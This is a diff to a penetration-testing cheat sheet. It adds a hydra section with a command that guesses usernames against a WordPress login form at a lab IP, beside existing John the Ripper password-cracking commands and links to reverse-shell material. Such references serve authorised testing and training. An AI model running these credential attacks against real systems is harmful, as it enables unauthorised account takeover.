@@ -13,6 +13,7 @@
       * [<a href="https://tools.kali.org/information-gathering/goofile" rel="nofollow">goofile</a>](#goofile)
       * [<a href="https://www.exploit-db.com/searchsploit" rel="nofollow">searchsploit</a>](#searchsploit)
       * [<a href="https://tools.kali.org/password-attacks/john" rel="nofollow">John The Ripper – JTR</a>](#john-the-ripper--jtr)
+      * [<a href="https://www.kali.org/tools/hydra/" rel="nofollow">hydra</a>](#hydra)
    * [Shells](#shells)
       * [Set Listener](#set-listener)
       * [<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="nofollow">Reverse Shell</a>](#reverse-shell)
@@ -120,6 +121,11 @@ John the Ripper is different from tools like Hydra. Hydra does blind brute-forci
 |john –wordlist=/usr/share/wordlists/rockyou.txt hash                    |JTR password cracking                     |
 |john –format=descrypt –wordlist/usr/share/wordlists/rockyou.txt hash.txt|JTR forced descrypt cracking with wordlist|
 |john –format=descrypt hash –show                                        |JTR forced descrypt brute force cracking  |
+
+### [hydra](https://www.kali.org/tools/hydra/)
+```zsh
+hydra -L wordlist -p test 10.10.147.44 -V http-form-post "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid Username" -t 30
+```
 
 ## Shells
 
